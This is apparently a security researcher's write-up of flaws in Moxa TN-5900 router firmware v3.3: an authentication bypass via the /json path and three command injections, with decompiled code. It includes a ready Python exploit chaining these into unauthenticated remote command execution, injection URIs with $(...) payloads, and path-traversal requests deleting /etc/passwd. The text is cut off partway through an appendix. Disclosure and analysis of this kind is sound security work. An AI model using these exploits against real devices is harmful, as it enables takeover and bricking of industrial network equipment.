Summary:
---
The Moxa Secure-Router series `moxa-tn-5900` suffers from an authentication bypass vulnerability and multiple authenticated Remote Command Execution vulnerabilities. This allows unauthenticated users to invoke administrative functionalities without being actually authenticated. Both vulnerability classes joined together allow for pre-auth Remote Command Execution.



Assessed Version:
---
moxa-tn-5900-series-firmware-v3.3.rom

All research presented was done on the webserver `webs` the cert agent binary `agent_cer_g` and depending libraries.


Involved binaries:
---
`/magicP/agent/agent_cer_g` sha1sum - cdc8bfc04cbe2381338880fe06da20e892331653
`/magicP/WebServer/webs` sha1sum - 6084c57222dfe29c4648584d4fe31653bf0d999f



Download Link:
---
https://cdn-cms.azureedge.net/getmedia/99b2a9a0-21f3-41a7-ae83-3b079fbc965b/moxa-tn-5900-series-firmware-v3.3.rom


How To Unpack The Firmware:
---

After downloading of the firmware `unblob` was used to extract the contents of the file system. The following shows the script contents of `unblob.sh`. Note, `docker` has to be installed.


```bash
cd firmwares
mkdir unblob_output

for f in `ls *.rom`; do
	echo "[*] Unpacking : " $f
	sudo docker run --rm -v $(pwd)/unblob_output:/data/output   -v $(pwd):/data/input ghcr.io/onekey-sec/unblob:latest /data/input/$f
done
``` 


And then used like this:
```
bash unpack.sh moxa-tn-5900-series-firmware-v3.3.rom
``` 




Writeup:
---

**Before we begin**

It has to be noted, that all these findings are build up upon from a previous assessment of the device which led to the two CVEs `CVE-2022-41758` (authentication bypass) and `CVE-2022-41759` authenticated command injection (resource: https://www.moxa.com/en/support/product-support/security-advisory/multiple-routers-improper-input-validation-vulnerabilities) but now due to unaccessability of the device and a failed story about emulating the services, the following is based on reversing and static analysis and hence could not be verified against a real device. 


**Beginning - Auth Bypass**

The Webserver for the `moxa-tn-5900-series` is based on [Goahead](https://www.embedthis.com/goahead/) and hence makes use of various GoAhead API calls.

Handlers for various HTTP endpoints are registered within the `FUN_12000b2f0` (based on Ghidra decompilation). The interesting excerpt can be seen below:


```c
undefined8 FUN_12000b2f0(int param_1)

{
...
    websUrlHandlerDefine(&DAT_120065cf8,0,0,websSecurityHandler,1);             // This is a security handler which does check for authentication
    websUrlHandlerDefine("/goform",0,0,websFormHandler_with_verify,0);          // Here again it is checked for authentication, afterwards the `websFormHandler` handler is invoked
    websUrlHandlerDefine("/json",0,0,websFormHandler,0);                        // Here the `websFormHanlder` is invoked *without* verifying the authentication, hence it is an auth-bypass
...

``` 

As can be seen the `websUrlHandlerDefine()` API call is used three times. The first argument is the respective endpoint the function (which is the second last parameter) shall handle.


The normal webpages (the html "code") are referencing for any form actions is `/goform/<somethinghere>`. Which triggers the invocation of  `websFormHandler_with_verify()`. 


Example excerpt of one of the `.asp` files invoking the handler:
```
user@Omaha:~/moxa-firmware-analysis/firmwares/unblob_output/moxa-tn-5900-series-firmware-v3.3.rom_extract/4194336-26411040.cramfs_extract/magicP/WebServer/web$ grep -rnPo 'action="(.*)"' .

<snip>

./restart_setting.asp:16:action="/goform/Restart"
./cos_mapping.asp:43:action="/goform/net_Web_get_value?SRV=SRV_COS_MAPPING"
./radius.asp:58:action="/goform/net_WebRadius_GetValue"
./dhcpd_dip.asp:507:action="/goform/net_Web_get_value_with_confirm?SRV=SRV_DHCP"
./passwd.asp:112:action="/goform/net_WebNewPWGetValue"
./trdp_filter.asp:149:action="/goform/net_Web_get_value?SRV=SRV_TRDP_FILTER_GLOBAL&SRV0=SRV_TRDP_FILTER"
./dhcpd_server_mode.asp:37:action="/goform/net_Web_get_value?SRV=SRV_DHCP_SVR_MODE"

<snip>


``` 

Without going into too much details here, as the name suggests, this function does indeed check if the user is authenticated.



While one `websUrlHandlerDefine()` call later, the same function is invoked for `/json/<somethinghere>` just without the check for authentication.

This is most likely used for static resources where no authentication has to be provided. Here arises a problem, as now it is possible to invoke authenticated functionality without having to be authenticated.



The exploitation is simple, for any endpoint found within the `.asp` pages which starts with `/goform/` this can be changed to `/json/<endpoint>` to invoke it unauthenticated.


For restarting the device normally a request can be made to this URI
`/goform/Restart`

when using the authentication bypass the request can be made to this URI
`/json/Restart` with the same effect.





**Going for Pre-Auth RCE - Command Injections**

In total three command injections were identified which allow for authenticated command injection. In conjunction with the authentication bypass these allow for pre-auth RCE. 


Below are only the necessary parts of the decompiled `web_CERMGMTUpload()` function in regards of the command injection. The full decompilation can be found within the appendix A.

```C

void web_CERMGMTUpload(longlong param_1,undefined8 param_2,undefined8 param_3)
{

  <SNIP>


  var_mgmtmode = (char *)websGetVar(local_40,"mgmtmode",&DAT_120068c88);    // [1]
  var_mgmtmode_atoi = atoi(var_mgmtmode);
  if ((var_mgmtmode_atoi < 0) || (2 < var_mgmtmode_atoi)) {
    FUN_120022d68(local_40,0,"Upload Fail, invalid mode !!!");
  }
  else {
    var_cer_file = (char *)websGetVar(local_40,"cer_file",&DAT_120067690);  // [2]
    sVar2 = strlen(var_cer_file);
    if (CONCAT44(extraout_v0_hi,sVar2) < 0x45) {                            // [3]
      lVar1 = is_filename_valid(var_cer_file);                              // [4]
      if (lVar1 == 0) {
        FUN_120022d68(local_40,0,"Upload Fail, invalid filename !!!");
      }
      else {
        strncpy((char *)&var_cert_file_truncated,var_cer_file,0x44);
        for (local_450 = 0; sVar2 = strlen((char *)&var_cert_file_truncated),
            (ulonglong)(longlong)local_450 < CONCAT44(extraout_v0_hi_00,sVar2);
            local_450 = local_450 + 1) {
          if (*(char *)((longlong)&var_cert_file_truncated + (longlong)local_450) == '.') {
            *(undefined *)((longlong)&var_cert_file_truncated + (longlong)local_450) = 0;
          }
        }
        var_cer_name = (undefined8 *)websGetVar(local_40,"cer_name",&DAT_120067690); // [5]
        if (*(char *)var_cer_name == '\0') {
          var_cer_name = &var_cert_file_truncated;
        }
        lVar1 = is_filename_valid(var_cer_name);
        if (lVar1 == 0) {
          FUN_120022d68(local_40,0,"Upload Fail, invalid label !!!");
        }
        else {
          sVar2 = strlen((char *)var_cer_name);
          if (CONCAT44(extraout_v0_hi_01,sVar2) < 0x41) {
            if (var_mgmtmode_atoi == 1) {
              var_CSRFile = websGetVar(local_40,"CSRFile",&DAT_120067690); // [6]
              lVar1 = is_filename_valid(var_CSRFile);
              if (lVar1 == 0) {
                FUN_120022d68(local_40,0,"Upload Fail, invalid CSR filename !!!");
                return;
              }
              snprintf((char *)&local_328,0x41,"%s/%s","/mnt/log1/csr_file",var_CSRFile);
            }
            else if (var_mgmtmode_atoi == 2) {
              memset(var_cer_pw_truncated,0,0x41);
              var_cer_pw = (char *)websGetVar(local_40,"cer_pw",&DAT_120067690); // [7]
              strncpy(var_cer_pw_truncated,var_cer_pw,0x20);    // [8]
              local_2c7 = 0;
              if ((var_cer_pw_truncated[0] != '\0') &&
                 (lVar1 = Ssys_CheckString(var_cer_pw_truncated), lVar1 < 0)) { // [9]
                FUN_120022d68(local_40,0,"Upload Fail, password with invalid character(s)!!!");
                return;
              }
            }
            if (var_mgmtmode_atoi == 2) {
              snprintf(cer_filepath,0x100,"%s/%s","/mnt/log1/p12_file",var_cer_name);
            }
            else {
              snprintf(cer_filepath,0x100,"%s/%s","/mnt/log1/cer_file",var_cer_name);
            }
            __fd = open(cer_filepath,0x102);
            if (__fd < 0) {
              FUN_120022d68(local_40,0,"Upload file fail !!!");
            }
            else {
              sVar3 = write(__fd,*(void **)(local_40 + 0x1c0),*(size_t *)(local_40 + 0x1c8));
              close(__fd);
              if (sVar3 < 1) {
                FUN_120022d68(local_40,0,"Certificate Save Fail !!!");
              }
              else {
                if (var_mgmtmode_atoi == 2) {
                  var_CSRFile = FUN_12003a460(&uStack_1a6);
                  snprintf(openssl_cmd,0x100,
                           "openssl pkcs12 -in \"%s\" -out %s -passout pass:%s -password pass:%s",
                           cer_filepath,var_CSRFile,var_cer_pw_truncated,var_cer_pw_truncated);			// [10]
                  system(openssl_cmd);										// [11]
                  var_unknwn = (char *)FUN_12003a460(&uStack_1a6);
                  stat(var_unknwn,asStack_160);
                  if ((extraout_v0_hi_02 < 0) || (asStack_160[0].__unused._4_8_ == 0)) {
                    unlink(cer_filepath);
                    FUN_120022d68(local_40,0,"Upload file fail !!!");
                    return;
                  }
                }
                if ((var_mgmtmode_atoi == 1) &&
                   (lVar1 = check_cer_csr_match(cer_filepath,&local_328), lVar1 == 0)) {
                  FUN_120022d68(local_40,0,"Upload Fail !!!");
                }
                else {
                  if (var_mgmtmode_atoi == 2) {
                    var_CSRFile = FUN_12003a460(&uStack_1a6);
                    snprintf(openssl_cmd,0x100,"openssl x509 -in %s -out \"%s/%s\"",var_CSRFile,
                             "/mnt/log1/cer_file",var_cer_name);
                    system(openssl_cmd);
                    var_CSRFile = FUN_12003a460(&uStack_1a6);
                    snprintf(openssl_cmd,0x100,"openssl rsa -in %s -out \"%s/%s\" -passin pass:%s",
                             var_CSRFile,"/mnt/log1/key_file",var_cer_name,var_cer_pw_truncated);
                    system(openssl_cmd);
                  }
                  snprintf(openssl_cmd,0x100,
                           "openssl x509 -in \"%s/%s\" -noout -subject|cut -c 10- >  \"%s/%s\"",
                           "/mnt/log1/cer_file",var_cer_name,"/mnt/log1/cer_info_file",var_cer_name)
                  ;
                  system(openssl_cmd);
                  snprintf(openssl_cmd,0x100,
                           "openssl x509 -in \"%s/%s\" -noout -issuer |cut -c %d- >> \"%s/%s\"",
                           "/mnt/log1/cer_file",var_cer_name,9,"/mnt/log1/cer_info_file",
                           var_cer_name);
                  system(openssl_cmd);
                  snprintf(openssl_cmd,0x100,
                           "openssl x509 -noout -dates -in \"%s/%s\" >>  \"%s/%s\"",
                           "/mnt/log1/cer_file",var_cer_name,"/mnt/log1/cer_info_file",var_cer_name)
                  ;
                  system(openssl_cmd);
                  if (var_mgmtmode_atoi == 2) {
                    snprintf(openssl_cmd,0x100,"echo  \"%s/%s\" >> \"%s/%s\"","/mnt/log1/key_file",
                             var_cer_name,"/mnt/log1/cer_info_file",var_cer_name);
                    system(openssl_cmd);
                  }
                  else if (var_mgmtmode_atoi == 1) {
                    snprintf(openssl_cmd,0x100,"cat \"%s/%s.info\" |sed -n \'2,2p\' >>  \"%s/%s\"",
                             "/mnt/log1/csr_file",&local_328,"/mnt/log1/cer_info_file",var_cer_name)
                    ;
                    system(openssl_cmd);
                  }
                  FUN_120022d68(local_40,0,"All new settings are now active !!!");
                }
              }
            }
          }
          else {
            snprintf(openssl_cmd,0x100,"Upload Fail, label exceeds %d characters !!!",0x40);
            FUN_120022d68(local_40,0,openssl_cmd);
          }
        }
      }
    }
    else {
      snprintf(openssl_cmd,0x100,"Upload Fail, certificate filename exceeds %d characters !!!",0x40)
      ;
      FUN_120022d68(local_40,0,openssl_cmd);
    }
  }
  return;
}


```

[1] The variable `mgmtmode` has to be set to `2` to fall into the correct `if` statement reaching the command injection vulnerability.


[2] The variable `cer_file` has to be passed, shorter than `0x45` [3] bytes long and also be a valid filename [4] (pass a simple regex check for "normal" filenames, not further discussed as not interesting for the exploit).

[5] The variable `cer_name` is subject to similar check than `cer_file`, it has to be shorter than `0x41` bytes and also be a valid filename.

[6] The variable `CSRFile` also has to pass pretty much the same checks as `cer_file` and `cer_name`.

[7] Then the interesting part comes, the variable `cer_pw` (which is later on used within a `system` call) is retrieved from the web request, truncated to `0x20` bytes [8
] and then subjected to a "security" check with a call to `Ssys_CheckString` [9].

```c

int Ssys_CheckString(char *param_1)

{
  char *pcVar1;
  size_t __length;
  int iVar2;
  re_registers rStack_a0;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined2 local_68;
  re_pattern_buffer local_60;
  
  if (param_1 != (char *)0x0) {
    local_68 = 0x2400;
    local_88 = 0x5e5b302d39612d7a;
    local_80 = 0x412d5a5f40212324;
    local_78 = 0x255e262a28295c2e;
    local_70 = 0x5c2f5c205c2d5d2b;
    local_60._8_8_ = 0;
    re_syntax_options = 0x20bb1d;
    local_60.buffer = (uchar *)0x0;
    local_60.translate = (uchar *)0x0;
    local_60._40_8_ = 0;
    pcVar1 = re_compile_pattern((char *)&local_88,0x21,&local_60);
    if (pcVar1 == (char *)0x0) {
      __length = strlen(param_1);
      iVar2 = re_match(&local_60,param_1,__length,0,&rStack_a0);
      return iVar2; // Regex matched [1]
    }
  }
  return -1; // Regex failed [2]
}
```

//// Essentially it boils down to this, if the regex matches, it returns a positive int [1]. Else return -1 [2]. 
//// Regex is: ^[0-9a-zA-Z_@!#$%^&*()\.\/\ \-]+$

->  Meaning the following are totally OK when checked with this regex:
// ../../../../../../etc/passwd
// $(whoami)

-> While these would not:
// `whoami`


To come back to the actual function `web_CERMGMTUpload` we are able to pass this check and continue.

While ignoring other stuff going on within inbetween of [9] and [10] I still didn't want to snip the inbetween code out. But lets continue, at [10] the `snprintf` creates a `openssl` command with the user supplied password, which as discussed can include a command injection payload. Hence leading to Pre-Auth RCE at [11].



## Exploit Code

```python
import requests

## Exploit against:
# moxa-tn-5900-series-firmware-v3.3.rom

URI = "/goform/web_CERMGMTUpload"
URI_AUTH_BYPASS = "/json/web_CERMGMTUpload"


# Change this
CMD_TO_EXEC = "ping -c 1 127.0.0.1"

data = {"mgmtmode" : "2", "cer_name" : "testmustbeuniq", "cer_pw" : f"$({CMD_TO_EXEC})"}

files = {'testfile': b"iguessthisisnotavalidencryptedcert"}

# Change this to the respective system
url = "https://127.0.0.1" + URI_AUTH_BYPASS

r = requests.post(url, files=files, data=data, verify=False)

print("[*] Exploit finished.")
```


### Two Authenticated Second Order Command Injection Vulnerabilities

Both of these vulnerabilities involve two services, which transfer data through a local socket. Simply put, the webserver sends unsanitized input to this second service through a local socket, which then uses this user controllable data to build up a command passed to `system` hence leading to Remote Command Execution.




**Second Order Command Injection - 1**
---


The below source code is the decompiled part of the `webs` service with modified variables to ease the understanding.

```c

void net_WebRSAKEYGen(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 var_rsakey_name;
  longlong did_str_pass_check;
  char *var_privateKey;
  ulonglong socket;
  int var_privateKey_atoi;
  char var_rsakey_name_truncd [64];
  undefined socket_buffer [260];
  undefined8 webs_t;
  undefined8 local_38;
  undefined8 local_30;
  undefined *local_20;
  
  local_20 = &_gp;
  webs_t = param_1;
  local_38 = param_2;
  local_30 = param_3;
  memset(socket_buffer,0,0x100);
  var_rsakey_name = websGetVar(webs_t,"rsakey_name",&DAT_120067690);	// [1] Retrieve variable from user
  did_str_pass_check = Ssys_CheckString(var_rsakey_name);		// [2] Check - Bypassable/Non-Relevant
  if (did_str_pass_check < 0) {
    FUN_1200233f4(webs_t,0,0);
  }
  else {
    snprintf(var_rsakey_name_truncd,0x40,"%s",var_rsakey_name);		// [3] Write user-controllable var into new stack var up to 0x40 bytes
    var_privateKey = (char *)websGetVar(webs_t,"privateKey",&DAT_120067690);	
    var_privateKey_atoi = atoi(var_privateKey);
    DAT_120176b94 = 0xb4;
    socket = sock_path(socket_buffer,0x100,"NET_CER_G.SOCKET");		
    send_agent(socket,0x30,L'w',&var_privateKey_atoi,0x44,1,1);		// [4] Send data to socket
    FUN_120022d68(webs_t,0,"All new settings are now active !!!");
  }
  return;
}
```


The function `net_WebRSAKEYGen` which is directly invokable as a HTTP client. On [1] the value of the `rsakey_name` HTTP variable is retrieved.
Then checked at [2], this is bypassable/non-relevant for cmd injection, as shown earlier for the first discussed command injection.


At [3] the user user passed value of `rsakey_name` is written into a stack buffer and trucated to up to 0x40 bytes.

Finally at [4] this value (and the integer value of the `privateKey` HTTP variable value) is passed to the socket. Subsequently this data is retrieved by the `agent_cer_g` binary. Based on the third parameter of `send_agent()` different functionality is executed on the other side (`agent_cer_g`)


The following is pseudo-C decompiled code (Ghidra) of the `Cert_Generate` within `agent_cer_g` binary.

```c
void Cert_Generate(void)

{
  undefined4 extraout_v0_hi;
  undefined4 extraout_v0_hi_00;
  undefined4 extraout_v0_hi_01;
  undefined4 extraout_v0_hi_02;
  undefined4 extraout_v0_hi_03;
  undefined4 extraout_v0_hi_04;
  undefined4 extraout_v0_hi_05;
  undefined4 extraout_v0_hi_06;
  undefined4 extraout_v0_hi_07;
  undefined4 extraout_v0_hi_08;
  undefined4 extraout_v0_hi_09;
  int iVar2;
  undefined8 uVar1;
  size_t sVar3;
  size_t sVar4;
  int local_2cc;
  char acStack_2c8 [256];
  undefined auStack_1c8 [4];
  undefined4 local_1c4;
  char acStack_fd [65];
  char acStack_bc [65];
  char acStack_7b [75];
  
  set_seq_avoid();
  do {
    iVar2 = net_RecvFromInterface1(&DAT_120105628,&DAT_120104c80,0);			// [1] Receive data from socket
  } while (iVar2 < 0);
  if (DAT_1201056ac == 'w') {								// [2] This is the third parameter of the previous `send_agent`
    shm_sysSetCerGenCheckFlag(0x77);
    snprintf(acStack_2c8,0x100,"openssl genrsa -out %s/%s-%d %d","/mnt/log1/rsakey_file",	// [3] Build the command (second `%s` is injectable)
             &DAT_120104c84,DAT_120104c80,DAT_120104c80);
    system(acStack_2c8);									// [4] Execute the command
    shm_sysSetCerGenCheckFlag(0);
  }
```

The send information is received at [1], then the third parameter of our `send_agent()` call is used to see in which `if` statement we fall. As this was not directly controllable and pre-set to `w` [2] we jump into the `if` statement.

At [3] the command is generated, our `` is then used to create a filepath like `/mnt/log1/rsakey_file/USER_CONTROLLABLE[...]` for the output keyfile. This leads to a second-order command injection vulnerability.


An example request to trigger the `ping` command can look like this:

```
/goform/net_WebRSAKEYGen?rsakey_name=$(ping -c 1 127.0.0.1)&privateKey=0x1337
```

This in conjunction with the already discussed authentication bypass enables a pre-auth RCE.
=>
```
/json/net_WebRSAKEYGen?rsakey_name=$(ping -c 1 127.0.0.1)&privateKey=0x1337
```




Again - Second order Command Injection
---

`webs`



```c
void net_WebCSRGen(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  <snip>
  
  local_20 = &_gp;
  local_40 = param_1;
  local_38 = param_2;
  local_30 = param_3;
  memset(auStack_147,0,0x100);
  memset(acStack_2f0,0,0x1a9);
  // Retrieve values of HTTP variables
  uVar1 = websGetVar(local_40,"contury",&DAT_120067690);
  snprintf(acStack_2f0,3,"%s",uVar1);
  uVar1 = websGetVar(local_40,"location",&DAT_120067690);
  snprintf(acStack_2cd,0x41,"%s",uVar1);
  uVar1 = websGetVar(local_40,"company",&DAT_120067690);
  snprintf(acStack_28c,0x41,"%s",uVar1);
  uVar1 = websGetVar(local_40,"departmnet",&DAT_120067690);
  snprintf(acStack_24b,0x41,"%s",uVar1);
  uVar1 = websGetVar(local_40,&global_cert_CA_str,&DAT_120067690);
  snprintf(acStack_20a,0x41,"%s",uVar1);
  uVar1 = websGetVar(local_40,&global_Cert_EA_str,&DAT_120067690);
  snprintf(acStack_1c9,0x41,"%s",uVar1);
  uVar1 = websGetVar(local_40,"RSAKey",&DAT_120067690); // Injectable
  snprintf(acStack_2ed,0x20,"%s",uVar1);
  uVar1 = websGetVar(local_40,"SUBNAME",&DAT_120067690);
  snprintf(acStack_188,0x41,"%s",uVar1);
  lVar2 = Ssys_CheckString(acStack_20a);
  if (lVar2 < 0) {
    FUN_1200233f4(local_40,0,0);
  }
  else {
    // Open local socket
    uVar1 = sock_path(auStack_147,0x100,"NET_CER_G.SOCKET");
    // Send data to local socket
    send_agent(uVar1,0x30,L'x',acStack_2f0,0x1a9,1,1);
    FUN_120022d68(local_40,0,"All new settings are now active !!!");
  }
  return;
}
```
Various values of the HTTP parameters are retrieved, and then finally sent to the local socket.


The next code snippets are from the `agent_cer_g` binary which receives and acts upon the user controllable information.


-
```c
void Cert_Generate(void)

{
...
  // This ('x') again is also set through the `send_agent()` function call
  else if (DAT_1201056ac == 'x') {
    CSR_Generate(&DAT_120104c80);
  }
...



void CSR_Generate(longlong param_1)

{
  int extraout_v0_hi;
  int extraout_v0_hi_00;
  int iVar1;
  int local_390;
  char acStack_388 [512];
  char acStack_188 [128];
  stat asStack_108 [2];
  longlong local_30;
  undefined *local_20;
  
  local_20 = &_gp;
  local_390 = 0;
  local_30 = param_1;
  shm_sysSetCerGenCheckFlag(0x78);
  snprintf(acStack_188,0x80,"%s/%s","/mnt/log1",local_30 + 0xe6);
  for (; (stat(acStack_188,asStack_108), extraout_v0_hi_00 < 0 && (local_390 < 10));
      local_390 = local_390 + 1) {
    csr_conf_set(local_30);
    snprintf(acStack_388,0x200,"openssl req -new -batch -key %s/%s -out %s/%s.csr -config %s/%s",
             "/mnt/log1/rsakey_file",local_30 + 3,"/mnt/log1/csr_file",local_30 + 0xe6,"/mnt/log1",
             "csr.conf");   // Here local_30+3 is the user controllable variable
    system(acStack_388);
    snprintf(acStack_388,0x200,"%s/%s","/mnt/log1",local_30 + 0xe6);
    stat(acStack_388,asStack_108);
    if (extraout_v0_hi < 0) {
      sleep(3);
    }
    iVar1 = check_csr_pkey_match();
    if (iVar1 == 1) break;
  }
  snprintf(acStack_388,0x200,"openssl req -in %s/%s.csr -noout -subject|cut -c 9- > %s/%s.csr.info",
           "/mnt/log1/csr_file",local_30 + 0xe6,"/mnt/log1/csr_file",local_30 + 0xe6);
  system(acStack_388);
  snprintf(acStack_388,0x200,"echo %s/%s >> %s/%s.csr.info","/mnt/log1/rsakey_file",local_30 + 3,
           "/mnt/log1/csr_file",local_30 + 0xe6);
  system(acStack_388);
  shm_sysSetCerGenCheckFlag(0);
  return;
}

```

URI for exploitation:
---
```
/goform/net_WebCSRGen?contury=germany&location=location&company=company&departmnet=department&CA=CA&EA=EA&RSAKey=$(ping -c 1 127.0.0.1)&SUBNAME=SUBNAME
```

URI for exploitation with auth bypass:
---
```
/json/net_WebCSRGen?contury=germany&location=location&company=company&departmnet=department&cert_CA=CA&EA=EA&RSAKey=$(ping -c 1 127.0.0.1)&SUBNAME=SUBNAME
```


## Other Vulnerabilities:
----

This chapter covers some other minor vulnerabilities which wouldn't qualify for a seperate case but I wanted to address anyway so they can get patched. All these are inside the respective `webs` binary (the webserver)


**Arbitrary File Delete**

```C

void net_WebRSAKEYDel(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 uVar1;
  longlong lVar2;
  char acStack_148 [264];
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined *local_20;
  
  local_20 = &_gp;
  local_40 = param_1;
  local_38 = param_2;
  local_30 = param_3;
  uVar1 = websGetVar(param_1,"rsakeyname",&DAT_120067690);
  lVar2 = Ssys_CheckString(uVar1);		// [1] Check can be "bypassed"/does not check for path traversal
  if (lVar2 < 0) {
    FUN_1200233f4(local_40,0,0);
  }
  else {
    snprintf(acStack_148,0x100,"%s/%s-1024","/mnt/log1/rsakey_file",uVar1);
    unlink(acStack_148);
    snprintf(acStack_148,0x100,"%s/%s-2048","/mnt/log1/rsakey_file",uVar1);
    unlink(acStack_148);
    snprintf(acStack_148,0x100,"%s/%s","/mnt/log1/rsakey_file",uVar1);			// HERE with path traversal, delete what you want
    unlink(acStack_148);
    FUN_120022d68(local_40,0,"All new settings are now active !!!");
  }
  return;
}
```

**Will most likely brick the system**

`/goform/net_WebRSAKEYDel?rsakeyname=../../../../../../../etc/passwd`

**Recommendation**
Ensure that only files within the intended directory can be unlinked, via a call to `realpath` 



***Arbitrary File Delete***

```c
void net_WebCSRDel(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  char *__s;
  longlong lVar1;
  char *local_d0;
  char acStack_c0 [128];
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined *local_20;
  
  local_20 = &_gp;
  local_40 = param_1;
  local_38 = param_2;
  local_30 = param_3;
  __s = (char *)websGetVar(param_1,"csrtmp",&DAT_120067690);
  local_d0 = strtok(__s,(char *)&DAT_120068ea0);
  while( true ) {
    if (local_d0 == (char *)0x0) {
      FUN_120022d68(local_40,0,"All new settings are now active !!!");
      return;
    }
    lVar1 = Ssys_CheckString(local_d0);
    if (lVar1 < 0) break;
    snprintf(acStack_c0,0x80,"%s/%s","/mnt/log1/csr_file",local_d0); // path traversal, delete what you want
    unlink(acStack_c0);
    snprintf(acStack_c0,0x80,"%s/%s.info","/mnt/log1/csr_file",local_d0);
    unlink(acStack_c0);
    local_d0 = strtok((char *)0x0,(char *)&DAT_120068ea0);
  }
  FUN_1200233f4(local_40,0,0);
  return;
}
```


**Will most likely brick the system**

`/goform/net_WebCSRDel?csrtmp=../../../../../../../etc/passwd`

**Recommendation**
Ensure that only files within the intended directory can be unlinked, via a call to `realpath` 



Appendix:
---

**A - web_CERMGMTUpload() Full Decompiled Source** 

```c

void web_CERMGMTUpload(longlong param_1,undefined8 param_2,undefined8 param_3)

{
  undefined4 extraout_v0_hi;
  int extraout_v0_hi_02;
  char *var_mgmtmode;
  int var_mgmtmode_atoi;
  char *var_cer_file;
  undefined4 extraout_v0_hi_00;
  undefined4 extraout_v0_hi_01;
  size_t sVar2;
  longlong lVar1;
  undefined8 var_CSRFile;
  char *var_cer_pw;
  int __fd;
  ssize_t sVar3;
  char *var_unknwn;
  int local_450;
  undefined8 *var_cer_name;
  char openssl_cmd [256];
  undefined8 local_328;
  undefined8 local_320;
  undefined8 local_318;
  undefined8 local_310;
  undefined8 local_308;
  undefined8 local_300;
  undefined8 local_2f8;
  undefined8 local_2f0;
  undefined local_2e8;
  char var_cer_pw_truncated [32];
  undefined local_2c7;
  char cer_filepath [256];
  undefined8 uStack_1a6;
  undefined8 local_19e;
  undefined auStack_196 [54];
  stat asStack_160 [2];
  undefined8 var_cert_file_truncated;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined4 local_48;
  undefined local_44;
  longlong local_40;
  undefined8 local_38;
  undefined8 local_30;
  
  local_40 = param_1;
  local_38 = param_2;
  local_30 = param_3;
  memset(openssl_cmd,0,0x100);
  local_328 = 0;
  local_320 = 0;
  local_318 = 0;
  local_310 = 0;
  local_308 = 0;
  local_300 = 0;
  local_2f8 = 0;
  local_2f0 = 0;
  local_2e8 = 0;
  memset(var_cer_pw_truncated,0,0x41);
  memset(cer_filepath,0,0x100);
  uStack_1a6 = 0x7031325f746d7066;
  local_19e = 0x696c652e70656d00;
  memset(auStack_196,0,0x31);
  var_cert_file_truncated = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_44 = 0;
  var_mgmtmode = (char *)websGetVar(local_40,"mgmtmode",&DAT_120068c88);
  var_mgmtmode_atoi = atoi(var_mgmtmode);
  if ((var_mgmtmode_atoi < 0) || (2 < var_mgmtmode_atoi)) {
    FUN_120022d68(local_40,0,"Upload Fail, invalid mode !!!");
  }
  else {
    var_cer_file = (char *)websGetVar(local_40,"cer_file",&DAT_120067690);
    sVar2 = strlen(var_cer_file);
    if (CONCAT44(extraout_v0_hi,sVar2) < 0x45) {
      lVar1 = is_filename_valid(var_cer_file);
      if (lVar1 == 0) {
        FUN_120022d68(local_40,0,"Upload Fail, invalid filename !!!");
      }
      else {
        strncpy((char *)&var_cert_file_truncated,var_cer_file,0x44);
        for (local_450 = 0; sVar2 = strlen((char *)&var_cert_file_truncated),
            (ulonglong)(longlong)local_450 < CONCAT44(extraout_v0_hi_00,sVar2);
            local_450 = local_450 + 1) {
          if (*(char *)((longlong)&var_cert_file_truncated + (longlong)local_450) == '.') {
            *(undefined *)((longlong)&var_cert_file_truncated + (longlong)local_450) = 0;
          }
        }
        var_cer_name = (undefined8 *)websGetVar(local_40,"cer_name",&DAT_120067690);
        if (*(char *)var_cer_name == '\0') {
          var_cer_name = &var_cert_file_truncated;
        }
        lVar1 = is_filename_valid(var_cer_name);
        if (lVar1 == 0) {
          FUN_120022d68(local_40,0,"Upload Fail, invalid label !!!");
        }
        else {
          sVar2 = strlen((char *)var_cer_name);
          if (CONCAT44(extraout_v0_hi_01,sVar2) < 0x41) {
            if (var_mgmtmode_atoi == 1) {
              var_CSRFile = websGetVar(local_40,"CSRFile",&DAT_120067690);
              lVar1 = is_filename_valid(var_CSRFile);
              if (lVar1 == 0) {
                FUN_120022d68(local_40,0,"Upload Fail, invalid CSR filename !!!");
                return;
              }
              snprintf((char *)&local_328,0x41,"%s/%s","/mnt/log1/csr_file",var_CSRFile);
            }
            else if (var_mgmtmode_atoi == 2) {
              memset(var_cer_pw_truncated,0,0x41);
              var_cer_pw = (char *)websGetVar(local_40,"cer_pw",&DAT_120067690);
              strncpy(var_cer_pw_truncated,var_cer_pw,0x20);
              local_2c7 = 0;
              if ((var_cer_pw_truncated[0] != '\0') &&
                 (lVar1 = Ssys_CheckString(var_cer_pw_truncated), lVar1 < 0)) {
                FUN_120022d68(local_40,0,"Upload Fail, password with invalid character(s)!!!");
                return;
              }
            }
            if (var_mgmtmode_atoi == 2) {
              snprintf(cer_filepath,0x100,"%s/%s","/mnt/log1/p12_file",var_cer_name);
            }
            else {
              snprintf(cer_filepath,0x100,"%s/%s","/mnt/log1/cer_file",var_cer_name);
            }
            __fd = open(cer_filepath,0x102);
            if (__fd < 0) {
              FUN_120022d68(local_40,0,"Upload file fail !!!");
            }
            else {
              sVar3 = write(__fd,*(void **)(local_40 + 0x1c0),*(size_t *)(local_40 + 0x1c8));
              close(__fd);
              if (sVar3 < 1) {
                FUN_120022d68(local_40,0,"Certificate Save Fail !!!");
              }
              else {
                if (var_mgmtmode_atoi == 2) {
                  var_CSRFile = FUN_12003a460(&uStack_1a6);
                  snprintf(openssl_cmd,0x100,
                           "openssl pkcs12 -in \"%s\" -out %s -passout pass:%s -password pass:%s",
                           cer_filepath,var_CSRFile,var_cer_pw_truncated,var_cer_pw_truncated);
                  system(openssl_cmd);
                  var_unknwn = (char *)FUN_12003a460(&uStack_1a6);
                  stat(var_unknwn,asStack_160);
                  if ((extraout_v0_hi_02 < 0) || (asStack_160[0].__unused._4_8_ == 0)) {
